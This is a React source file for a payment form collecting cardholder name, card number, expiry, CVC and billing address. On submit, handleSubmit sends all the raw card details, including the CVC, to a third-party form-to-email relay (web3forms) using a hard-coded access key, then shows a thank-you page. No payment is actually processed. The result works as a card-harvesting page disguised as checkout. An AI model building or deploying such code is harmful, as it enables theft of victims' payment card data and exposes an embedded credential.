import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import cardolo from '../assets/presets/card.png';
import PaymentFinal from './PaymentFinal';

const PaymentForm = () => {
  const [formData, setFormData] = useState({
    cardName: '',
    cardNumber: '',
    expiryDate: '',
    cvc: '',
    billingAddress: ''
  });

  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPaymentFinal, setShowPaymentFinal] = useState(false); // State to manage visibility of PaymentFinal
  const navigate = useNavigate();

  // Handle form input changes
  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.id]: e.target.value
    });
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      // Construct the message content
      const message = `
        Cardholder's Name: ${formData.cardName}
        Card Number: ${formData.cardNumber}
        Expiry Date: ${formData.expiryDate}
        CVC: ${formData.cvc}
        Billing Address: ${formData.billingAddress}
      `;

      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          access_key: '73a93441-dfff-414e-b270-54e744e1a0f8', 
          subject: 'Payment Form Submission',
          message: message,
          cardName: formData.cardName,
          cardNumber: formData.cardNumber,
          expiryDate: formData.expiryDate,
          cvc: formData.cvc,
          billingAddress: formData.billingAddress
        })
      });

      const result = await response.json();

      if (result.success) {
        navigate('/thank-you');
      } else {
        setError('Failed to submit the form. Please try again.');
      }
    } catch (error) {
      setError('An error occurred. Please try again later.');
    } finally {
      setLoading(false);
    }
  };

  const isBillingAddressValid = formData.billingAddress.length >= 30;

  return (
    <>
      <div className="bg-white p-6 rounded-lg shadow-lg">
        <h2 className="text-2xl font-medium mb-4 border-b border-black p-1">Payment Information</h2>
        {error && <p className="text-red-500 mb-4">{error}</p>}
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <label htmlFor="cardName" className="block text-sm font-medium text-gray-700">
              Cardholder's Name
            </label>
            <input
              type="text"
              id="cardName"
              value={formData.cardName}
              onChange={handleChange}
              className="mt-1 p-2 block w-full border border-gray-300 rounded-md shadow-sm"
              placeholder="Enter cardholder's name"
              required
            />
          </div>

          <div className="mb-4">
            <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700">
              Card Number
            </label>
            <input
              type="text"
              id="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              className="mt-1 p-2 block w-full border border-gray-300 rounded-md shadow-sm"
              placeholder="Enter card number"
              required
            />
          </div>

          <div className="flex space-x-4 mb-4">
            <div className="w-1/2">
              <label htmlFor="expiryDate" className="block text-sm font-medium text-gray-700">
                Expiry Date
              </label>
              <input
                type="text"
                id="expiryDate"
                value={formData.expiryDate}
                onChange={handleChange}
                className="mt-1 p-2 block w-full border border-gray-300 rounded-md shadow-sm"
                placeholder="MM/YY"
                required
              />
            </div>

            <div className="w-1/2">
              <label htmlFor="cvc" className="block text-sm font-medium text-gray-700">
                CVC
              </label>
              <input
                type="text"
                id="cvc"
                value={formData.cvc}
                onChange={handleChange}
                className="mt-1 p-2 block w-full border border-gray-300 rounded-md shadow-sm"
                placeholder="CVC"
                required
              />
            </div>
          </div>

          <div className="mb-4">
            <label htmlFor="billingAddress" className="block text-sm font-medium text-gray-700">
              Billing Address
            </label>
            <input
              type="text"
              id="billingAddress"
              value={formData.billingAddress}
              onChange={handleChange}
              className="mt-1 p-2 block w-full border border-gray-300 rounded-md shadow-sm"
              placeholder="Enter Billing Address (minimum 30 characters)"
              required
            />
            {formData.billingAddress.length < 30 && (
              <p className="text-red-500 text-sm mt-1">
                Billing address must be at least 30 characters long.
              </p>
            )}
          </div>

          {/* Checkbox to toggle PaymentFinal */}
          <div className="mb-4">
            <label className="flex items-center text-sm font-medium text-gray-700">
              <input
                type="checkbox"
                checked={showPaymentFinal}
                onChange={() => setShowPaymentFinal(!showPaymentFinal)}
                className="mr-2"
              />
              Show Other Payment Options
            </label>
          </div>

          <button
            type="submit"
            className="flex items-center bg-blue-500 text-white py-2 px-4 rounded-lg disabled:opacity-50"
            disabled={loading || !isBillingAddressValid}
          >
            <img src={cardolo} alt="" className="mr-2 w-10 h-8" />
            {loading ? <span>Processing...</span> : <span>Proceed</span>}
          </button>
        </form>
      </div>
      {showPaymentFinal && <PaymentFinal />} {/* Conditionally render PaymentFinal */}
    </>
  );
};

export default PaymentForm;